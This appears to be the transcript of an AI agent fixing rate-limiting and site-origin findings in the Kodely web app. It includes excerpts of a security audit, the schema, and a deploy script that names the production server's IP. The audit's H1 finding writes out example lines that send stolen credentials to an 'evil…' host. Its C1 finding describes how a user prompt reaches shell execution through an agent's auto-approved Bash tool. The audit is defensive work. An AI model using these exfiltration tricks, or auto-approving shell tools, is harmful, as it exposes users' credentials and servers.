Work in C:\Users\edmem\kodely-prod (Next.js 16 + Prisma, an AI website builder called Kodely at kodely.me).

FIX two HIGH findings from the internal security audit. Read `docs/security/audit-2026-08.md` first — findings H1 and H2. This is the owner's own application and authorized remediation work.

## H2 — no rate limiting on login or signup
`lib/rate-limit.ts` has three limiters and **every one keys on `userId`**, so none can apply before authentication. Neither `app/api/auth/login/route.ts` nor `app/api/auth/signup/route.ts` imports any limiter. Unlimited password guessing and unlimited account creation — and each new account is granted 750 credits (`SIGNUP_GRANT`), which is real model spend, so signup abuse costs actual money.

Build a pre-auth limiter. Considerations you must actually think through:
- **Keying.** IP is the obvious key and is genuinely imperfect: it's shared behind NAT and corporate proxies, and it's spoofable unless you take it from the right header. This app sits behind Cloudflare — work out which header is trustworthy and which is attacker-controlled, and say so in a comment. Getting this wrong makes the limiter either useless or a way to lock out real users.
- **Login vs signup need different shapes.** Login should also throttle per *account* (many IPs against one email is credential stuffing), not only per IP. Signup is about volume from one source.
- **Fail direction.** Decide deliberately whether the limiter fails open or closed when its backing store is unavailable, and justify it.
- The three existing limiters differ: two are DB-backed and one is in-memory. Read them and follow whichever pattern genuinely fits — note in your report that an in-memory limiter is per-process and resets on deploy.
- Responses must not leak whether an email exists. Keep timing and messages uniform.

## H1 — generated sites are served on the app's own origin
`app/api/site/[slug]/[[...path]]/route.ts` has no host check, and `proxy.ts` falls through on the apex domain. So `https://kodely.me/api/site/<any-published-slug>/` serves arbitrary customer HTML as **first-party** content on the main domain — a phishing surface. (`httpOnly` cookies and `connect-src 'none'` mean it is not account takeover; do not overstate it.)

Read `proxy.ts` carefully first — it rewrites `<slug>.kodely.site` to this internal path, and **staging deliberately serves sites at `staging.kodely.me/api/site/<slug>` because there is no wildcard DNS off prod.** Whatever you do must not break staging or the legitimate rewrite. Read `lib/site-seo.ts` too — it derives canonical URLs from exactly this distinction.

## Scope — YOU MAY ONLY EDIT: `lib/rate-limit.ts`, `app/api/auth/login/route.ts`, `app/api/auth/signup/route.ts`, `app/api/site/[slug]/**`, `proxy.ts`
DO NOT modify: prisma/schema.prisma, anything else under lib/, other app/api/** routes, app/**, deploy.sh, .env, package.json.

## Constraints
- **Do not break the existing rewrite paths.** Prove `<slug>.kodely.site` and the staging form still work. Test with real `Host` headers against a local production build (`npx next start -p 3009` after the tree is built, then `Host:` header requests) — do NOT test against kodely.me or any remote host.
- Do not weaken any existing limiter.
- No new npm dependencies. Do NOT run `npm run build` unless you need it to run `next start` for testing; do NOT `git commit`, `git push`, or run `deploy.sh`.
- **HARD GATE: `npx tsc --noEmit` and `npx eslint app lib components` must BOTH be clean.** Parallel agents are running — errors in files you did not touch are not yours.

## Report back
Your keying decision for each limiter and the reasoning, which header you trust for client IP and why, the fail-open/fail-closed choice, exactly what you did about H1 and what you proved still works (with the Host headers and status codes you tested), and anything you chose not to do.

2	
3	Read-only review of `app/`, `lib/`, `proxy.ts`, `prisma/schema.prisma`, and `scripts/`.
4	No application code was modified. Nothing was tested against kodely.me or any remote host;
5	every finding below is derived from reading the code in this checkout.
6	
7	Secrets are referred to by environment-variable **name** only. No credential value appears
8	in this document.
9	
10	---
11	
12	## Summary
13	
14	| # | Severity | Finding | Location |
15	|---|----------|---------|----------|
16	| C1 | **Critical** | Agent SDK engine auto-approves unrestricted `Bash` → RCE from a user prompt | `lib/agent-sdk.ts:286-288` |
17	| C2 | **Critical** | Agent-authored `vite.config.ts` is executed by `vite build` with the full process env → RCE on *both* engines | `lib/build-site.ts:52-69` |

20	| M1 | Medium | Credit-ledger read-then-write race (lost update) | `lib/credits.ts:63-94` |
21	| M2 | Medium | `insert-seo-batch*.mjs` writes unvalidated HTML into a `dangerouslySetInnerHTML` sink | `scripts/insert-seo-batch1.mjs:8-25` |

29	## Critical

31	### C1 — The SDK build engine gives a user prompt unrestricted shell on the app server
32	
33	**`lib/agent-sdk.ts:281-288`**
34	
35	```ts
36	for await (const message of query({
37	  prompt: `${historyText}## Current request\n${opts.request}${imageNote}`,
38	  options: {
39	    cwd: workDir,
40	    systemPrompt: adaptPromptForSdk(systemPrompt),
41	    allowedTools: ["Read", "Write", "Edit", "Bash", "Glob", "Grep"],
42	    permissionMode: "acceptEdits",
43	  },
44	}))
45	```
46	
47	`allowedTools` is **not** a restriction list. The SDK's own type documentation
48	(`node_modules/@anthropic-ai/claude-agent-sdk/sdk.d.ts:1416-1422`) states:
49	
50	> "List of tool names that are auto-allowed without prompting for permission. These tools
51	> will execute automatically without asking the user for approval. To restrict which tools
52	> are available, use the `tools` option instead."
53	
54	So listing `"Bash"` there **auto-approves every shell command the model emits**, with no
55	`canUseTool` callback, no `disallowedTools`, and no hooks anywhere in this file.

163	### H1 — Published sites are served from the application's own origin
164	
165	**`app/api/site/[slug]/[[...path]]/route.ts:31-91`** (no auth, no host check) combined with
166	**`proxy.ts:33-40, 64`**.
167	
168	The proxy rewrites `<slug>.kodely.site/x` to `/api/site/<slug>/x`. It does **not** block the
169	internal path on the app host — a request to `kodely.me` falls through to
170	`NextResponse.next()` at `proxy.ts:64`, and the route handler matches directly.
171	
172	So `https://kodely.me/api/site/<any-published-slug>/index.html` returns attacker-authored
173	HTML with `Content-Type: text/html` (line 90) and
174	`script-src 'self' 'unsafe-inline'` (line 29) — where `'self'` is now **kodely.me**.
175	`lib/site-seo.ts:52` confirms this path form is a supported, intended shape, not an accident.
176	
177	**Exploitation path.** Any user publishes a site containing arbitrary markup and script, then
178	sends a victim the `kodely.me` URL. The script executes as first-party code on the main
179	application origin, with a valid certificate and the real domain in the address bar.
180	
181	**Bounding the impact honestly** — I tried to break this down rather than call it account
182	takeover:
183	
184	- The session cookie is `httpOnly` (`lib/auth.ts:42`), so it cannot be read from script.
185	- `connect-src 'none'` blocks `fetch`/`XHR`, so the script cannot call `/api/*` with the
186	  victim's cookies. This is a real and effective mitigation.
187	- Form posts are **not** blocked (no `form-action` — see M4), but most API routes parse
188	  `req.json()` and reject urlencoded bodies. `POST /api/auth/logout` takes no body, so
189	  forced logout works; that is nuisance-grade.
190	- What is **not** mitigated is the phishing surface: the script can repaint the page as a
191	  Kodely login form at a genuine `https://kodely.me/...` URL and `POST` the credentials to
192	  an external host via `<form action="https://evil…">`, or exfiltrate via
193	  `location = 'https://evil…?d=' + data`. Neither is stoppable by the current CSP.
194	
195	That makes this credential theft at a trusted origin rather than direct session theft —
196	high, not critical.
197	
198	**Verified not vulnerable:** the sibling preview route is scoped correctly.
199	`app/api/preview/[id]/[[...path]]/route.ts:29` does
200	`findFirst({ where: { id, userId: user.id } })`, so a link to another user's draft returns
201	404 for the victim. Only the *owner* can render their own draft on the app origin, which is
202	self-XSS and not a cross-user path.
203	
204	**Fix.** Serve site content only on the sites domain: in the site route, return 404 unless
205	the `Host` ends with `KODELY_SITES_BASE`; keep the `/api/site/<slug>` path form for staging
206	behind an explicit staging-host check. Long-term, move both site and preview serving to a
207	separate registrable domain so `'self'` can never mean the app origin.

245	
246	**`lib/credits.ts:63-94`**
247	
248	```ts
249	export async function grantCredits(userId, amount, reason) {
250	  const balance = await getBalance(userId);        // read
251	  return db.creditLedger.create({ … balanceAfter: balance + amount });   // write

254	
255	`getBalance` reads `balanceAfter` off the newest row and the insert happens in a separate
256	statement, with no transaction, no lock, and no unique constraint to collide on. Two
257	concurrent operations both read balance `B` and both write a row derived from `B`; the later
258	row's `balanceAfter` clobbers the earlier one's accounting. `chargeForBuild` (`:82-94`) has
259	the identical shape, so two builds finishing together can result in the user being charged
260	once. `createdAt` ties at millisecond precision make ordering non-deterministic too.

262	This is **already known to the codebase** — `app/api/rewards/_lib.ts:322-326` names it
263	precisely and scopes the advisory-lock fix to rewards only:
264	
265	> "*(A build charge committing between this transaction's read and its insert would still be
266	> clobbered — that race is inherent to the ledger's read-then-write shape and predates this
267	> feature …)*"

269	Not rated higher because the win is bounded (credits, not money) and exploiting it reliably
270	needs tight request timing. The admin users page already surfaces the symptom as "Ledger
271	drift" (`app/admin/users/page.tsx:223`), which is a good detection control.

275	`SELECT … FOR UPDATE` on the user row.

302	### M3 — Contact-form throttle keys on a spoofable header

304	**`app/api/contact/route.ts:30-35`**

445	  ones most likely to slip and both are correct:

458	  `app/api/rewards/_lib.ts:273-274,337-338` and the raw queries in `lib/retention.ts:174,286,301`
459	  are likewise parameterized with constant inputs.
460	- **Billing integrity is sound.** Signature verified before anything else
461	  (`webhook/route.ts:22-30`); the idempotency row is claimed *before* the grant (`:36-42`);
462	  credit amounts are re-derived server-side from the fixed `CREDIT_PACKS` table rather than
463	  trusted from webhook metadata (`:49-55`, `lib/stripe.ts:24-32`); the checkout route lets the
464	  client choose only a pack id (`checkout/route.ts:18-22`). This is the correct design.
465	- **Path traversal is closed on every path I checked.** `normalizePath` (`lib/agent.ts:164-170`)
466	  and `safeRelPath` (`lib/agent-sdk.ts:206-212`) both reject `..`, absolute paths, backslashes,
467	  and non-allowlisted characters. The `[[...path]]` catch-alls in the site and preview routes
468	  do exact **string equality against a DB column** (`site/…:75-77`, `preview/…:33-35`) — there
469	  is no filesystem lookup to traverse. `lib/zip.ts:61-67` strips rather than rejects traversal
470	  segments.
471	- **The editor preview iframe is sandboxed correctly.** `app/projects/[id]/Editor.tsx:476` uses
472	  `sandbox="allow-scripts allow-forms"` **without** `allow-same-origin`, so preview content runs
473	  in an opaque origin and cannot touch the parent app even though it is served from a
474	  same-origin path. This is the right call and it is easy to get wrong.
475	- **Passwords and session tokens.** scrypt with a 16-byte random salt and `timingSafeEqual`
476	  (`lib/auth.ts:15-28`); 32 bytes of `randomBytes` for the token, stored only as a SHA-256 hash
477	  so a DB read yields no usable cookie (`:30-38`); `httpOnly`, `sameSite: "lax"`, `secure` in
478	  production, and no `domain` — the host-only property that `proxy.ts:51-57` explicitly relies
479	  on. Login responses are shape-identical whether or not the account exists
480	  (`login/route.ts:17-24`).
481	- **OAuth CSRF is handled on both flows.** Random state in an HttpOnly cookie, compared server
482	  side (`google/start:34,51`, `google/callback:42`). The Discord flow goes further and pins the
483	  Kodely user id into the state, re-checked at `discord/callback:81`, with a constant-time
484	  compare at `:47-52` — that is what stops a captured callback being replayed into another
485	  session. Google account linking requires `email_verified` (`google/callback:67`), which
486	  correctly blocks takeover of an existing password account via an unverified Google email.
487	- **The rewards system is the best-defended part of the codebase.** Secret-keyed HMAC identity
488	  hashes so ledger read access cannot enumerate customers (`_lib.ts:71-87,138-145`), one grant
489	  per *external* identity across all accounts, a 24-hour account-age gate, a global velocity
490	  circuit breaker, and correct `pg_advisory_xact_lock` serialization with a fixed lock ordering
491	  to avoid deadlock (`:246-311`). It fails closed when unkeyed and when Discord's answer is
492	  inconclusive (`discord/callback:133-140`).
493	- **SMTP header injection is closed.** `lib/mail.ts:50-52` strips CR/LF and length-caps before
494	  any user value reaches `replyTo` or `subject`.
495	- **The enhance path is a good example of the opposite of C1.** `lib/enhance.ts:143-157` runs the
496	  SDK with `allowedTools: []`, `settingSources: []`, `cwd: tmpdir()`, `maxTurns: 1` — the user
497	  prompt is data and the agent has no tool to act with. This is the pattern `lib/agent-sdk.ts`
498	  should follow.
499	- **No secrets in the client bundle.** The only `NEXT_PUBLIC_*` reference in the entire tree is
500	  `NEXT_PUBLIC_SITES_BASE` (`app/projects/[id]/Editor.tsx:24`), a public hostname. No hardcoded
501	  credential appears in any source file; `.env*` is gitignored and untracked. `lib/db.ts` does
502	  not enable Prisma query logging. No secret is written to any log or response.
503	- **CSRF is adequately covered without tokens**, because `sameSite: "lax"` blocks cross-site
504	  form posts and every mutating route is POST/PATCH/PUT/DELETE parsing `req.json()`. I found no
505	  state-changing `GET`.
506	- **Retention reasoning is sound.** `SESSION_GRACE_DAYS = 0` (`lib/retention.ts:36`) purges
507	  expired sessions immediately; `STRIPE_EVENT_RETENTION_DAYS = 365` (`:100`) gives a ~100x
508	  margin over Stripe's ~3-day automatic retry window, with the residual manual-resend risk
509	  documented rather than hidden; `CreditLedger` is correctly exempt from pruning (`:425-459`).
510	
511	---
512	
513	## Not assessed — and why
514	
515	- **Production environment values.** The only `.env` available is this checkout's, which
516	  describes itself as a local dev copy pointing at a local Postgres. It sets
517	  `KODELY_ENGINE=sdk`, but **I cannot confirm what the production VM sets.** If prod runs
518	  `api`, C1 does not apply there — C2 still does, on both engines. *Confirming
519	  `KODELY_ENGINE` on `/opt/kodely` is the single highest-value next step.*
520	- **Host and edge configuration.** nginx server blocks, Cloudflare WAF/rate-limiting rules,
521	  TLS/HSTS at the edge, and whether the `*.kodely.site` wildcard is restricted to the prod app
522	  — none are in this repo. This matters for H1 (whether `/api/site/…` is reachable on
523	  kodely.me through the edge), H2 (whether Cloudflare already throttles login), M3, and L3.
524	- **VM privileges.** Whether the `kodely` service account has passwordless sudo beyond
525	  `systemctl`, the filesystem permissions on `/opt/kodely/.env` and
526	  `/home/kodely/kodely-foundation`, and whether any container or systemd sandboxing
527	  (`ProtectSystem`, `PrivateTmp`, `NoNewPrivileges`) confines the process. This determines how
528	  far C1 and C2 actually reach. `deploy.sh:92` shows at least `sudo systemctl restart`.
529	- **Database privileges.** Whether the app's Postgres role is superuser or scoped, which bounds
530	  what a recovered `DATABASE_URL` grants.
531	- **Runtime behaviour.** No finding here was confirmed by execution — per the brief, nothing
532	  was run against kodely.me or any remote host, and no exploit was executed locally. C1 and C2
533	  are argued from the SDK's own type documentation and from Vite's documented config
534	  resolution, not from a proof-of-concept.
535	- **Deployed vs. committed code.** `git status` shows ~30 modified files in the working tree.
536	  This review covers the working-tree contents, which may differ from what is live.
537	- **A new feature surface appeared mid-audit and is only spot-checked.** `app/api/notifications/`,
538	  `lib/notifications/`, `lib/templates.ts`, `app/templates/`, and `components/templates/` were
539	  written to disk *during* this review (file timestamps 03:40–03:45, after the initial sweep),
540	  so they were not part of the systematic pass. What I did check looks good:
541	  `app/api/notifications/run/route.ts:53-71` fails closed when `KODELY_CRON_SECRET` is unset or
542	  shorter than 16 characters, accepts the secret by header only (never a query parameter),
543	  compares in constant time over fixed-length SHA-256 digests so neither value nor length
544	  leaks, returns 404 rather than 401, and caps sends per kind (`:41`).
545	  `lib/notifications/templates.ts:119-146` escapes every interpolated value into the email HTML,
546	  and there is no `dangerouslySetInnerHTML` in the new template gallery. **This surface needs its

548	  `lib/notifications/send.ts` and `scan.ts`, which I did not read in full. I also saw no
549	  unsubscribe mechanism, which is a compliance question rather than a security one.

556	   `...process.env` to the build child. This is the one that survives an engine switch.
557	2. **C1** — confirm the production `KODELY_ENGINE`; remove `Bash` from `allowedTools`; sandbox

1	// Kodely — Phase 1 data model.
2	// Principles baked in here (see the Kodely board):
3	//  - every generation is a Build row with real token counts, so cost per build is never a guess
4	//  - credits are a ledger, never a mutable counter: the balance is derivable and auditable
5	//  - failed builds are recorded but NEVER charged
6	
7	generator client {
8	  provider = "prisma-client-js"
9	}
10	
11	datasource db {
12	  provider = "postgresql"
13	  url      = env("DATABASE_URL")
14	}
15	
16	model User {
17	  id               String   @id @default(cuid())
18	  email            String   @unique
19	  // Nullable because a Google-only account never sets a local password.
20	  passwordHash     String?
21	  googleId         String?  @unique
22	  name             String?
23	  role             String   @default("CUSTOMER") // CUSTOMER | ADMIN
24	  stripeCustomerId String?
25	  createdAt        DateTime @default(now())
26	
27	  // Self-imposed ceiling on credits spent per rolling 30 days. NULL = no cap.
28	  // This is the user's own guard against a runaway session, not a plan limit —
29	  // bill shock is the category's deepest trust wound (one competitor billed
30	  // $607 against a $25 plan in three days), and a cap the user sets themselves
31	  // is the cheapest honest answer to it.
32	  spendCapCredits Int?
33	
34	  sessions     Session[]
35	  projects     Project[]
36	  ledger       CreditLedger[]
37	  events       Event[]
38	  supportNotes SupportNote[]
39	}
40	
41	// First-party analytics. Self-hosted deliberately: cheaper, keeps the data
42	// ours, avoids another paid API on the critical path, and is privacy-clean.
43	//
44	// One wide table rather than a table per dashboard, because the activation
45	// funnel, retention cohorts, per-user journey, attribution and the overview
46	// tiles are all different queries over the same stream. Build it once, or
47	// every dashboard invents its own tracking.
48	model Event {
49	  id     String  @id @default(cuid())
50	  // Nullable so pre-signup events (landing view, prompt submitted) still land.
51	  userId String?
52	  /// Dotted, past-tense name — see EVENTS in lib/events.ts. Never free text.
53	  name   String
54	  /// Small, non-PII payload: ids, counts, enum-ish strings. Never prompt bodies.
55	  props  Json?
56	
57	  createdAt DateTime @default(now())
58	
59	  user User? @relation(fields: [userId], references: [id], onDelete: SetNull)
60	
61	  // Funnels scan by name over a window; journeys scan one user over a window.
62	  @@index([name, createdAt])
63	  @@index([userId, createdAt])
64	}
65	
66	// One row per transactional email actually sent.
67	//
68	// Without this, notification idempotency has to be derived from a time window,
69	// which is at-most-once: a skipped cron run drops that window, and a process
70	// restart mid-window can resend. The unique constraint below makes it
71	// exactly-once — the insert IS the claim, so two workers racing produce one
72	// email and one conflict.
73	//
74	// `dedupeKey` is the id of the thing that triggered it (the ledger row that
75	// dropped someone into "low", the failed build, the project first published),
76	// NOT a timestamp. That is what makes the guarantee independent of scheduling.
77	model EmailLog {
78	  id        String   @id @default(cuid())
79	  userId    String
80	  /// welcome | low_credits | build_failed | site_published
81	  kind      String
82	  dedupeKey String
83	  sentAt    DateTime @default(now())
84	
85	  @@unique([kind, dedupeKey])
86	  @@index([userId, sentAt])
87	}
88	
89	// Who did what in the admin panel. Admin surfaces read cost, margin, customer
90	// prompts and personal data; without a log, "who looked at this account" has no
91	// answer. Append-only by convention — nothing in the app updates or deletes a row.
92	model AdminAuditLog {
93	  id         String   @id @default(cuid())
94	  /// The admin who acted. Kept as a plain id, not a relation, so the record
95	  /// survives that admin's account being deleted.
96	  actorId    String
97	  actorEmail String
98	  /// Dotted, past-tense: "user.viewed", "site.taken_down", "flag.changed".
99	  action     String
100	  targetType String?
101	  targetId   String?
102	  /// Small, non-PII context. Never prompt bodies or generated content.
103	  meta       Json?
104	  createdAt  DateTime @default(now())
105	
106	  @@index([actorId, createdAt])
107	  @@index([action, createdAt])
108	  @@index([targetType, targetId])
109	}
110	
111	// Runtime kill switches and gradual rollout. Deliberately a table rather than
112	// env vars: flipping a flag must not require a deploy, which is the entire
113	// point of having a kill switch.
114	model FeatureFlag {
115	  key         String   @id
116	  enabled     Boolean  @default(false)
117	  description String   @default("")
118	  /// 0-100. Ignored when `enabled` is false. Bucketed by user id so a given
119	  /// user's answer is stable rather than flickering between requests.
120	  rolloutPct  Int      @default(100)
121	  updatedAt   DateTime @updatedAt
122	  updatedBy   String?
123	}
124	
125	// One row per moderation finding per publish attempt. Sub-blocking findings
126	// previously went only to console.warn — enough to reconstruct one site after
127	// it is reported, not enough to query proactively, and not enough to ever
128	// measure the false-positive rate that gates promoting a rule to blocking.
129	model ModerationFinding {
130	  id        String   @id @default(cuid())
131	  projectId String
132	  rule      String
133	  severity  String // high | medium | low
134	  path      String
135	  evidence  String
136	  /// "blocked" when this finding stopped the publish, "recorded" otherwise.
137	  action    String
138	  createdAt DateTime @default(now())
139	
140	  reviewedAt DateTime?
141	  reviewedBy String?
142	  /// Set on review: "true_positive" | "false_positive".
143	  outcome    String?
144	
145	  @@index([projectId, createdAt])
146	  @@index([severity, createdAt])
147	  @@index([rule, createdAt])
148	}

150	// Operator-written notes about a customer, for support continuity. Never shown
151	// to the customer, so it must never be used to store anything we would not
152	// stand behind if disclosed in a data-subject access request.
153	model SupportNote {
154	  id          String   @id @default(cuid())
155	  userId      String
156	  authorEmail String
157	  body        String
158	  createdAt   DateTime @default(now())
159	
160	  user User @relation(fields: [userId], references: [id], onDelete: Cascade)
161	
162	  @@index([userId, createdAt])
163	}
164	
165	// Every processed Stripe webhook event, keyed by Stripe's own event id.
166	// This is the idempotency guard: a webhook retry (Stripe resends on any
167	// non-2xx or timeout) must never grant credits twice for the same payment.
168	model StripeEvent {
169	  id        String   @id
170	  type      String
171	  createdAt DateTime @default(now())
172	}
173	
174	model Session {
175	  id        String   @id @default(cuid())
176	  userId    String
177	  tokenHash String   @unique
178	  expiresAt DateTime
179	  createdAt DateTime @default(now())
180	
181	  user User @relation(fields: [userId], references: [id], onDelete: Cascade)
182	
183	  @@index([userId])
184	}
185	
186	model Project {
187	  id        String   @id @default(cuid())
188	  userId    String
189	  name      String
190	  slug      String   @unique // becomes <slug>.kodely.site when published
191	  createdAt DateTime @default(now())
192	  updatedAt DateTime @updatedAt
193	
194	  publishedAt DateTime?
195	
196	  user     User          @relation(fields: [userId], references: [id], onDelete: Cascade)
197	  files    ProjectFile[]
198	  messages Message[]
199	  builds   Build[]
200	
201	  @@index([userId])
202	}
203	
204	// The working tree of a generated project. `published` files are the live
205	// snapshot served on the public subdomain; draft files are what the preview shows.
206	// `kind` separates the two file universes that live in this one table:
207	// "source" is the real Vite+React+TS project the agent edits (never served
208	// directly — a browser can't run raw .tsx); "build" is the compiled static
209	// output (lib/build-site.ts) that preview/publish/site-serving actually read.
210	model ProjectFile {
211	  id        String   @id @default(cuid())
212	  projectId String
213	  path      String
214	  content   String
215	  published Boolean  @default(false)
216	  kind      String   @default("source") // "source" | "build"
217	  updatedAt DateTime @updatedAt
218	
219	  project Project @relation(fields: [projectId], references: [id], onDelete: Cascade)
220	
221	  @@unique([projectId, path, published, kind])
222	  @@index([projectId])
223	}
224	
225	model Message {
226	  id        String   @id @default(cuid())
227	  projectId String
228	  role      String // user | assistant
229	  content   String
230	  createdAt DateTime @default(now())
231	
232	  project Project @relation(fields: [projectId], references: [id], onDelete: Cascade)
233	
234	  @@index([projectId])
235	}
236	
237	model Build {
238	  id        String    @id @default(cuid())
239	  projectId String
240	  status    String    @default("RUNNING") // RUNNING | SUCCEEDED | FAILED
241	  model     String
242	  prompt    String
243	  error     String?
244	  createdAt DateTime  @default(now())
245	  endedAt   DateTime?
246	
247	  inputTokens      Int @default(0)
248	  outputTokens     Int @default(0)
249	  cacheReadTokens  Int @default(0)
250	  cacheWriteTokens Int @default(0)
251	  filesWritten     Int @default(0)
252	
253	  // How many times the build had to be repaired before it compiled. 0 means it
254	  // compiled first try. This is the instrument for "green-build-first-try",
255	  // which the roadmap names as a kill-criterion gating the jump to backend
256	  // work — and which, until now, nothing measured. Retries are also the
257	  // clearest early signal of prompt or model regressions.

260	  // Full draft file tree AFTER this build finished, as {path: content}. Small
261	  // sites, so a JSON snapshot per successful build is cheap and makes rollback
262	  // a plain restore instead of needing per-file version history.
263	  filesSnapshot Json?
264	
265	  // Real model spend in micro-dollars, and what we actually charged.
266	  costMicros     Int @default(0)
267	  creditsCharged Int @default(0)
268	
269	  project Project        @relation(fields: [projectId], references: [id], onDelete: Cascade)
270	  ledger  CreditLedger[]
271	
272	  @@index([projectId])
273	}

276	  id          String   @id @default(cuid())
277	  userId      String
278	  delta       Int // negative = spend, positive = grant/refund
279	  reason      String
280	  buildId     String?
281	  balanceAfter Int
282	  createdAt   DateTime @default(now())
283	
284	  user  User   @relation(fields: [userId], references: [id], onDelete: Cascade)

287	  @@index([userId])

291	// personas — see the "SEO · *" board columns). bodyHtml is pre-rendered,
292	// hand-authored semantic HTML, not user input or markdown rendered at
293	// runtime — there's no templating/interpolation risk serving it directly.

298	  metaDescription String

301	  bodyHtml        String
302	  publishedAt     DateTime @default(now())

305	  @@index([category])

Since there's no dedicated table and I can't touch the schema, I'm considering repurposing the Event model to track failed login attempts, storing hashed IP and email in the props field and counting occurrences within a time window using the existing index.

I'm weighing whether writing directly to the Event table from rate-limit.ts oversteps scope, and comparing that against a simpler in-memory limiter — the latter being easy but process-local and reset on every deploy, which doesn't hold up across multiple instances.

I'm leaning toward the DB-backed approach since it's durable and survives deploys, with low write volume for login attempts, and checking that retention pruning won't interfere since the rate-limit windows are short. I'm also confirming that Prisma's JSON path filtering on Postgres works for querying by a key inside props, and that storing a null userId on these events is already an established pattern, so that part should be safe.

I'm weighing whether to encode the rate-limit key into the event name itself versus keeping it in props — but that would violate the naming convention and pollute analytics funnel queries, so keeping the name constant and the key in props is the better choice. #!/usr/bin/env bash
# deploy.sh — push this checkout's committed work to kodely.me.
#
#   ./deploy.sh            staging -> verify -> prod -> verify
#   ./deploy.sh --staging  stop after staging
#
# Transport note: the VM cannot currently reach GitHub over SSH (see the board
# card "VM cannot reach GitHub over SSH"). Its own /home/kodely/deploy.sh runs
# `git fetch origin main && git reset --hard origin/main`, and when that fetch
# fails it resets to a STALE remote-tracking ref and reports a healthy deploy
# of the WRONG commit — it did that twice on 2026-08-21.
#
# So this script does not rely on the VM pulling. It still pushes to GitHub
# (that works from here, and keeps origin authoritative), then ships the actual
# commits over the existing SSH path as a git bundle and builds in place. When
# the VM's GitHub access is restored, the bundle step can be dropped.
set -euo pipefail

HOST=root@51.79.162.96
VM=kodely@10.20.0.30
STAGING_ONLY="${1:-}"

say() { printf '\n\033[1m== %s\033[0m\n' "$*"; }
die() { printf '\n\033[31mABORT: %s\033[0m\n' "$*" >&2; exit 1; }
vm()  { ssh -o BatchMode=yes -o ConnectTimeout=15 "$HOST" "ssh -o BatchMode=yes $VM \"$1\""; }

say "Pre-flight"
[ "$(git rev-parse --abbrev-ref HEAD)" = "main" ] || die "not on main"
[ -z "$(git status --porcelain)" ] || die "working tree dirty — commit first"

git fetch -q origin main || die "cannot reach GitHub from here"
if [ -n "$(git log --oneline origin/main..HEAD)" ]; then
  say "Pushing to origin/main"
  git log --oneline origin/main..HEAD | sed 's/^/  /'
  git push -q origin main
fi
NEW=$(git rev-parse --short HEAD)
echo "  main = $NEW"

ROLLBACK=$(vm 'cd /opt/kodely && git rev-parse --short HEAD')
say "Rollback point (current prod): $ROLLBACK"

# --------------------------------------------------------------- transport
# Bundle only what the VM is missing, using prod's current HEAD as the base.
say "Bundling commits for the VM"
# Base on the OLDER of the two environments, not just prod: staging is
# routinely behind, and a bundle cut from prod's HEAD would be missing the
# commits staging still needs. merge-base gives the common ancestor.
PROD_HEAD=$(vm 'cd /opt/kodely && git rev-parse HEAD')
STAGING_HEAD=$(vm 'cd /opt/kodely-staging && git rev-parse HEAD')
for c in "$PROD_HEAD" "$STAGING_HEAD"; do
  git cat-file -e "${c}^{commit}" 2>/dev/null || die "the VM is on commit ${c:0:7}, which this checkout does not have — fetch/rebase first"
done
BASE=$(git merge-base "$PROD_HEAD" "$STAGING_HEAD")
echo "  prod=${PROD_HEAD:0:7}  staging=${STAGING_HEAD:0:7}  base=${BASE:0:7}"

if [ "$BASE" = "$(git rev-parse HEAD)" ]; then
  echo "  both environments already at $NEW — nothing to transport"
  rm -f /tmp/kodely-deploy.bundle
  vm "rm -f /tmp/kodely-deploy.bundle" || true
else
  # Must be `..main`, not `..HEAD`: a bundle cut against HEAD is written with a
  # ref literally named "HEAD", and the VM's `git fetch <bundle> main` then
  # fails with "couldn't find remote ref main".
  git bundle create /tmp/kodely-deploy.bundle "$BASE..main" >/dev/null 2>&1
  echo "  $(git rev-list --count "$BASE..HEAD") commit(s), $(du -h /tmp/kodely-deploy.bundle | cut -f1)"
  base64 -w0 /tmp/kodely-deploy.bundle > /tmp/kodely-deploy.b64
  B64=$(cat /tmp/kodely-deploy.b64)
  ssh -o BatchMode=yes -o ConnectTimeout=15 "$HOST" \
    "echo '$B64' | ssh -o BatchMode=yes $VM 'base64 -d > /tmp/kodely-deploy.bundle'" \
    || die "could not transfer the bundle to the VM"
  vm "cd /opt/kodely && git bundle verify /tmp/kodely-deploy.bundle >/dev/null 2>&1" \
    || die "bundle failed verification on the VM"
  echo "  transferred and verified"
fi

deploy_env() {
  local env="$1" dir="$2" svc="$3" url="$4"

  say "Deploying $env"
  # Apply the bundle, then build. Every step is chained with && under `set -e`
  # so a failure here fails the deploy instead of leaving stale code running.
  vm "set -e
      cd $dir
      if [ -f /tmp/kodely-deploy.bundle ]; then
        git fetch -q /tmp/kodely-deploy.bundle main
        git update-ref refs/remotes/origin/main FETCH_HEAD
        git reset -q --hard FETCH_HEAD
      fi
      npm ci --no-audit --no-fund >/dev/null 2>&1
      npm run build >/dev/null 2>&1
      sudo systemctl restart $svc" || die "$env deploy failed"
  sleep 5

  say "Verifying $env"
  local head build code
  head=$(vm "cd $dir && git rev-parse --short HEAD")
  build=$(vm "stat -c %y $dir/.next/BUILD_ID | cut -d. -f1")
  echo "  HEAD=$head  BUILD_ID=$build  service=$(vm "systemctl is-active $svc")"
  # The check that catches a stale deploy: HEAD must equal what we just shipped.
  [ "$head" = "$NEW" ] || die "$env is on $head, expected $NEW — deploy did not take"
  for path in /api/health / /pricing /blog /contact; do
    code=$(curl -s -o /dev/null -w '%{http_code}' -m 25 "$url$path")
    printf '  %-12s %s\n' "$path" "$code"
    [ "$code" = "200" ] || die "$env $path returned $code"
  done
}

deploy_env staging /opt/kodely-staging kodely-staging https://staging.kodely.me

if [ "$STAGING_ONLY" = "--staging" ]; then
  say "Stopped after staging. Prod untouched."
  exit 0
fi

deploy_env prod /opt/kodely kodely https://kodely.me

say "Shipped"
echo "  main:     $NEW"
echo "  live:     https://kodely.me"

Node runtime handlers should be fine importing crypto, and it won't leak into the proxy's edge context. I'm weighing whether hashing emails is worth it since the DB already stores them in plaintext anyway, but it still helps avoid keeping a plaintext registry in the in-memory rate-limit map.

Hashing with a per-process random salt makes the stored keys non-reversible, which is cheap to add and worth doing. I'm keeping the IP extraction helper internal rather than exported, since routes will just pass the request object into the limiter functions directly.

Designing the rate-limit store now...

